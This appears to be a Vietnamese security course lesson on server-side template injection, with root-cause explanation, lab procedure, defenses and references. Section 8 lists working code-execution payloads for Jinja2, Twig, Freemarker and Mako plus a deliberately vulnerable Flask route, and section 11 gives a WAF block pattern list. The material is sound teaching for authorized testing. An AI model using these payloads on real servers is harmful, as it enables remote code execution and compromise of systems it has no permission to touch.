---
schema_version: 1
id: WEB-A05-SSTI
title: "Server-Side Template Injection (SSTI)"
slug: ssti
level: advanced
estimated_minutes: 65
prerequisites:
  - http-fundamentals
  - authorized-security-testing
owasp:
  []
cwe:
  - CWE-1336
content_status: technical-review
payload_status: static-verified
last_verified: null
---

# Server-Side Template Injection (SSTI)

> [!CAUTION]
> Chỉ thực hành trên hệ thống bạn sở hữu hoặc có ủy quyền rõ ràng. Dùng dữ liệu giả, fixture có thể hủy và giới hạn tài nguyên; không gửi payload đến Internet hoặc mục tiêu thật.

## 1. Mục tiêu học tập

Sau bài học, bạn có thể:

- Giải thích Server-Side Template Injection (SSTI) bằng root cause thay vì chỉ mô tả hậu quả.
- Nhận diện trust boundary, tài sản, actor và điều kiện cần để lỗi có thể bị khai thác.
- Thực hiện kiểm thử có kiểm soát trong lab local và phân biệt expected result với false positive.
- Chọn kiểm soát gốc, triển khai bản sửa và retest bằng positive, negative và boundary case.

## 2. Kiến thức cần có

- Nắm luồng HTTP request/response và cách ứng dụng xử lý input qua các trust boundary.
- Phân biệt authentication, authorization và validation.
- Biết đọc code/configuration trong ngôn ngữ hoặc framework xuất hiện ở ví dụ.
- Có lab local cô lập, dữ liệu giả, log quan sát được và quyền kiểm thử rõ ràng.

## 3. Kiến thức nền tảng

Để tạo ra các trang web động đẹp mắt một cách nhanh chóng, lập trình viên sử dụng các công cụ gọi là Template Engine (như Jinja2 trong Python, Twig trong PHP, hay Freemarker trong Java). Hãy tưởng tượng Template Engine giống như một khuôn mẫu thư gửi khách hàng có sẵn các ô trống dạng `{{ tên_khách_hàng }}`. Công cụ này sẽ tự động lấy tên thực tế để điền vào khuôn trước khi gửi đi. Khi hoạt động bình thường, dữ liệu của người dùng được truyền riêng biệt dưới dạng tham số nên cực kỳ an toàn, trình duyệt chỉ hiển thị nó dưới dạng văn bản thô.

```python
# Normal Jinja2 template rendering in Flask
from flask import Flask, render_template_string

app = Flask(__name__)

@app.route('/hello/<name>')
def hello(name):
    # Safe: user input is passed as DATA to the template
    template = "Hello, {{ username }}! Welcome to our site."
    return render_template_string(template, username=name)
    # Template engine escapes the value and renders it safely
```

Điểm quan trọng: khi user input được truyền dưới dạng **data** vào template, nó an toàn. Vấn đề phát sinh khi user input được **nhúng trực tiếp vào template string** trước khi render — lúc này input trở thành một phần của template code và được engine thực thi.

## 4. Mô tả và nguyên nhân gốc

Lỗ hổng Server-Side Template Injection (SSTI) xảy ra khi lập trình viên ghép nối trực tiếp chuỗi thông tin của người dùng vào cấu trúc của khuôn mẫu trước khi mang đi xử lý, thay vì truyền nó dưới dạng dữ liệu riêng biệt. Việc này giống như cho phép người nhận thư tự viết thêm các hướng dẫn logic vào chính khuôn mẫu của bạn. Kẻ tấn công có thể chèn các cú pháp lập trình đặc biệt vào ô nhập liệu để bắt Template Engine thực thi. Vì các Template Engine này chạy trực tiếp trên máy chủ và có quyền truy cập vào các hàm lập trình cốt lõi bên dưới, kẻ tấn công có thể lợi dụng để đọc trộm các file bí mật, lấy cắp biến môi trường, hoặc thực thi lệnh hệ thống để chiếm quyền điều khiển hoàn toàn máy chủ (RCE).

> **Gate kỹ thuật:** các nguồn cần được đối chiếu trực tiếp cho từng claim trước khi đổi `content_status` sang `verified`: [S1], [S2], [S3], [S4], [S5].

## 5. Mô hình đe dọa và điều kiện khai thác

- **Tài sản:** template context, runtime object và quyền tiến trình.
- **Actor, xác thực và role:** role user điều khiển trường profile được render.
- **Điều kiện khai thác:** input trở thành template source nên engine evaluate expression/object graph.
- **Browser, proxy, framework và phiên bản:** fixture Flask/Jinja2, Twig, Freemarker và Mako được pin trong container no-network riêng; phải lưu image/package version thực tế cùng evidence.
- **Bằng chứng bắt buộc:** cùng correlation ID phải nối input, quyết định kiểm soát và tác động lên đúng tài sản; status code riêng lẻ không đủ. [S1]

## 6. Cơ chế tấn công

Đối với ssti, input trở thành template source nên engine evaluate expression/object graph. Positive case phải chứng minh input đến đúng sink và tạo tác động đã mô tả; negative case khi bật kiểm soát gốc phải bị chặn trước side effect. Kết luận chỉ áp dụng cho môi trường được pin ở mục 5. [S1]

## 7. Kiểm thử trong lab được ủy quyền

1. **Setup:** khởi chạy fixture Flask/Jinja2, Twig, Freemarker và Mako được pin trong container no-network riêng; chỉ nạp dữ liệu tổng hợp, bật log ứng dụng/proxy/datastore và gắn correlation ID.
2. **Baseline:** gửi một input hợp lệ của use case ssti; lưu raw request/response, quyết định policy và trạng thái tài sản trước test.
3. **Input và thao tác:** dùng đúng một payload cốt lõi ở mục 8 trong context đã annotation; thay đổi một biến mỗi lần và tuân thủ request cap.
4. **Expected result:** chỉ coi vulnerable fixture là positive khi log chứng minh cơ chế “input trở thành template source nên engine evaluate expression/object graph”; secure fixture phải chặn trước side effect và boundary input phải fail closed.
5. **Cleanup:** xóa dữ liệu, marker và log của ssti; thu hồi session/cache liên quan, hoàn nguyên snapshot và xác nhận không còn callback/process test.
6. **Giới hạn an toàn:** chỉ chạy trên loopback/`.lab.test`; không dùng target, credential hoặc dữ liệu thật; OOB/DoS/state-changing phải có network/CPU/memory/request cap.

## 8. Payload và phạm vi áp dụng

Các block dưới đây được giữ để technical review. `static-verified` chỉ xác nhận cấu trúc/annotation đã qua gate tĩnh; nó **không** chứng minh payload hoạt động trên mọi phiên bản. Trước khi chạy phải đối chiếu `context`, điều kiện cần, encoding, expected result và risk. Payload mở rộng thuộc `cheatsheets/`; lesson chỉ giữ ví dụ cốt lõi.

### Bước 1: Phát hiện SSTI

<!-- payload-id: WEB-A05-SSTI-001 -->
<!-- context: template-expression probes evaluated separately in pinned Jinja2, Twig, Freemarker, Mako, Pebble, Thymeleaf and ERB fixtures -->
<!-- prerequisites: one arithmetic probe per disposable engine fixture; no sensitive objects; no outbound network -->
<!-- encoding: UTF-8 template source; the arrow/result labels are documentation and are not submitted -->
<!-- expected-result: only the matching fixture evaluates its isolated arithmetic expression; literal output or parser error is recorded for others -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
```
# Polyglot detection payload - test across multiple engines
${{<%[%'"}}%\.

# Engine-specific probes
{{7*7}}         → 49   (Jinja2, Twig)
${7*7}          → 49   (Freemarker, Mako, EL)
#{7*7}          → 49   (Pebble, Thymeleaf)
<%= 7*7 %>      → 49   (ERB - Ruby)
{{7*'7'}}       → 7777777  (Jinja2 specifically, string repeat)
{{7*'7'}}       → 49       (Twig, does multiplication)
```

### Bước 2: RCE Payloads theo Engine

<!-- payload-id: WEB-A05-SSTI-002 -->
<!-- context: pinned vulnerable Flask/Jinja2 fixture that exposes the referenced globals and Python class graph -->
<!-- prerequisites: disposable Python container; no outbound network; commands limited to printf SSTI_LAB; subclass indexes discovered in the same fixture -->
<!-- encoding: UTF-8 Jinja2 expression; shell command is literal ASCII -->
<!-- expected-result: applicable expression returns SSTI_LAB; nonmatching indexes or hardened environment fail without host side effects -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
```python
# Jinja2 (Python) - Class traversal to reach os.popen()
# Step 1: Access the Method Resolution Order (MRO)
{{''.__class__.__mro__[1].__subclasses__()}}

# Step 2: Find subprocess.Popen (usually index ~400+)
{{''.__class__.__mro__[1].__subclasses__()[408]('printf SSTI_LAB',shell=True,stdout=-1).communicate()}}

# Shorter Jinja2 RCE payload
{{config.__class__.__init__.__globals__['os'].popen('printf SSTI_LAB').read()}}

# Using request object in Flask
{{request.application.__globals__.__builtins__.__import__('os').popen('printf SSTI_LAB').read()}}
```

<!-- payload-id: WEB-A05-SSTI-003 -->
<!-- context: pinned legacy Twig fixture where the demonstrated callback/filter APIs are intentionally exposed -->
<!-- prerequisites: disposable PHP container; no outbound network; command is limited to printf SSTI_LAB; confirm API availability for the pinned Twig version -->
<!-- encoding: UTF-8 Twig template expression; command argument is literal ASCII -->
<!-- expected-result: vulnerable fixture output contains SSTI_LAB; patched or unsupported Twig versions reject the expression -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
```php
// Twig (PHP) - Using filter function
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("printf SSTI_LAB")}}

// Twig 3.x payload
{{['SSTI_LAB']|map('printf')}}
```

<!-- payload-id: WEB-A05-SSTI-004 -->
<!-- context: pinned vulnerable Freemarker fixture with Execute utility intentionally available -->
<!-- prerequisites: disposable Java container; no outbound network; command limited to printf SSTI_LAB -->
<!-- encoding: UTF-8 Freemarker expression; command is literal ASCII -->
<!-- expected-result: vulnerable fixture output contains SSTI_LAB; hardened object-wrapper configuration rejects Execute -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
```java
// Freemarker (Java) - Built-in Execute
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("printf SSTI_LAB")}

// Using ObjectConstructor
${"freemarker.template.utility.Execute"?new()("printf SSTI_LAB")}
```

<!-- payload-id: WEB-A05-SSTI-005 -->
<!-- context: pinned vulnerable Mako fixture rendering attacker-controlled template source -->
<!-- prerequisites: disposable Python container; no outbound network; command limited to printf SSTI_LAB -->
<!-- encoding: UTF-8 Mako expression; shell command is literal ASCII -->
<!-- expected-result: vulnerable fixture output contains SSTI_LAB; safe fixture treats the input as data -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
```python
# Mako (Python) - Direct Python code execution
<%import os%>${os.popen("printf SSTI_LAB").read()}

# Alternative Mako payload
${__import__('os').popen('printf SSTI_LAB').read()}
```

### Bước 3: Khai thác thực tế

<!-- payload-id: WEB-A05-SSTI-006 -->
<!-- context: Flask/Jinja2 route passes the decoded name query value into render_template_string via an f-string -->
<!-- prerequisites: disposable fixture; no outbound network; payload command limited to printf SSTI_LAB; one request -->
<!-- encoding: Jinja2 braces and spaces are percent-encoded once in the HTTP query by the client -->
<!-- expected-result: vulnerable response contains SSTI_LAB; secure route renders the expression literally as user data -->
<!-- risk: non-destructive -->
<!-- runnable: false -->
<!-- validation: static-verified -->
<!-- sources: S1 -->
<!-- last-verified: 2026-07-17 -->
```python
# Vulnerable Flask application
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route('/profile')
def profile():
    name = request.args.get('name', 'Guest')
    # VULNERABLE: User input concatenated into template string
    template = f"<h1>Welcome, {name}!</h1>"
    return render_template_string(template)

# Attack URL:
# /profile?name={{config.__class__.__init__.__globals__['os'].popen('printf+SSTI_LAB').read()}}
```

## 9. Code dễ bị lỗi và code an toàn

```python
# ❌ VULNERABLE: User input embedded in template string
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route('/greeting')
def greeting():
    name = request.args.get('name')
    # User input becomes part of the template CODE
    template = f"Hello {name}, welcome back!"
    return render_template_string(template)  # SSTI possible!
```

```python
# ✅ SECURE: User input passed as template data
from flask import Flask, request, render_template_string
from jinja2.sandbox import SandboxedEnvironment

app = Flask(__name__)

@app.route('/greeting')
def greeting():
    name = request.args.get('name')
    # User input is DATA, not part of the template code
    template = "Hello {{ name }}, welcome back!"
    return render_template_string(template, name=name)  # Safe rendering

@app.route('/custom-template')
def custom_template():
    user_template = request.args.get('tpl')
    # If user-provided templates are required, use sandboxed environment
    env = SandboxedEnvironment()
    try:
        tpl = env.from_string(user_template)
        return tpl.render(allowed_var="safe_value")
    except Exception:
        return "Invalid template", 400
```

## 10. Phát hiện

- Ghi log actor/session, route hoặc operation, object/resource, kết quả policy và correlation ID; không ghi secret hoặc toàn bộ token.
- So sánh authorization/validation failure với baseline hợp lệ và cảnh báo theo chuỗi hành vi, không chỉ theo một chuỗi payload.
- Kết hợp telemetry ứng dụng, reverse proxy và datastore để xác nhận request đã tới sink và có/không có tác động.
- Scanner hoặc WAF alert chỉ là tín hiệu điều tra; không phải bằng chứng duy nhất rằng lỗ hổng tồn tại. [S1]

## 11. Phòng thủ

### Kiểm soát bắt buộc

- Giữ template source tĩnh và chỉ truyền input qua biến dữ liệu.
- Áp dụng cùng kiểm soát cho mọi route, operation và đường xử lý tương đương; thất bại phải dừng trước side effect.

### Defense-in-depth

Các biện pháp dưới đây hỗ trợ giảm blast radius hoặc tăng khả năng phát hiện. Rate limit, UUID khó đoán, WAF, CSP hoặc validation chung không được dùng để thay thế kiểm soát gốc.

- **Tóm tắt**: Truyền dữ liệu người dùng thông qua các biến ngữ cảnh (context variables) thay vì nhúng trực tiếp vào chuỗi template.
- **Các bước chi tiết**:
  - Không bao giờ nhúng user input vào template string: Truyền dữ liệu qua context variables.
  - Sandbox environment: Sử dụng Jinja2 `SandboxedEnvironment` để giới hạn class/method access.
  - Logic-less templates: Chọn template engine không cho phép thực thi code (Mustache, Handlebars).
  - WAF rules: Chặn các pattern như `{{`, `${`, `<%`, `__class__`, `__mro__`.
  - Tách biệt template từ user content: Nếu cần template tùy chỉnh, chạy trong container isolated.

## 12. Retest

- **Positive case:** luồng hợp lệ vẫn hoạt động đúng cho actor và dữ liệu được phép.
- **Negative case:** cùng input/tài nguyên nhưng actor hoặc context không được phép bị từ chối mà không rò rỉ chi tiết nhạy cảm.
- **Boundary case:** kiểm tra giá trị rỗng, cực biên, encoding khác, request lặp, trạng thái phiên hết hạn và đường dẫn/operation tương đương.
- **Telemetry:** xác nhận policy decision, application log, proxy log và datastore side effect khớp correlation ID.
- **Regression:** lưu testcase tối thiểu tái hiện lỗi cũ và testcase chứng minh bản sửa không phụ thuộc WAF/rate limit.

## 13. Sai lầm thường gặp

- Chỉ kiểm tra status code hoặc chuỗi phản hồi mà không xác nhận side effect và log.
- Dùng payload đúng cú pháp nhưng sai DBMS, browser, framework, protocol hoặc injection context.
- Coi UUID, rate limit, WAF, CSP hoặc input validation chung là bản sửa cho một kiểm soát gốc khác.
- Chỉ sửa một route trong khi cùng sink/policy được dùng ở route khác.
- Đánh dấu `verified` dù nguồn, phiên bản fixture hoặc evidence payload chưa được lưu.

## 14. Tóm tắt và checklist

- [ ] Root cause, hậu quả và kỹ thuật khai thác đã được tách riêng.
- [ ] Actor, role/authentication, trust boundary, công nghệ và phiên bản đã rõ.
- [ ] Payload có ID duy nhất, context, encoding, điều kiện, expected result, risk, validation và source.
- [ ] Code dễ lỗi/an toàn dùng cùng framework, phiên bản và use case.
- [ ] Kiểm soát bắt buộc không bị thay thế bằng defense-in-depth.
- [ ] Positive, negative, boundary case và telemetry đã qua retest.
- [ ] Claim nhạy cảm có source marker và mọi link chỉ nằm ở mục 16–17.
- [ ] Cleanup hoàn tất; không còn secret, target thật, callback Internet hoặc dữ liệu khách hàng.

## 15. Giải thích thuật ngữ

- **SSTI (Server-Side Template Injection)**: Lỗ hổng tiêm cấu trúc mã của template engine vào ứng dụng để máy chủ biên dịch.
- **Template Engine**: Bộ công cụ giúp tách biệt phần giao diện HTML và logic xử lý dữ liệu của lập trình viên.
- **Render**: Quá trình đưa dữ liệu thực tế ghép vào khuôn mẫu để tạo nên trang web hoàn chỉnh.
- **Object Model**: Sơ đồ các đối tượng lập trình có thể truy cập được từ bên trong ngôn ngữ.
- **RCE**: Thực thi mã từ xa, cho phép chiếm quyền kiểm soát máy chủ.

## 16. Bài liên quan và đọc thêm

- [Remote Code Execution](../../10-exceptional-conditions/remote-code-execution/) — Khái niệm thực thi mã từ xa trên máy chủ đích, vốn là hậu quả phổ biến nhất khi khai thác thành công lỗ hổng SSTI.

## 17. Tài liệu tham khảo

- **[S1]** PortSwigger. https://portswigger.net/web-security/server-side-template-injection — phiên bản/trạng thái: bản hiện hành; truy cập: 2026-07-17.
- **[S2]** HackTricks – SSTI. https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html — phiên bản/trạng thái: bản hiện hành; truy cập: 2026-07-17.
- **[S3]** CWE-1336. https://cwe.mitre.org/data/definitions/1336.html — phiên bản/trạng thái: bản hiện hành; truy cập: 2026-07-17.
- **[S4]** PayloadsAllTheThings – SSTI. https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection — phiên bản/trạng thái: bản hiện hành; truy cập: 2026-07-17.
- **[S5]** OWASP Top 10:2025. https://owasp.org/Top10/2025/ — phiên bản/trạng thái: bản hiện hành; truy cập: 2026-07-17.
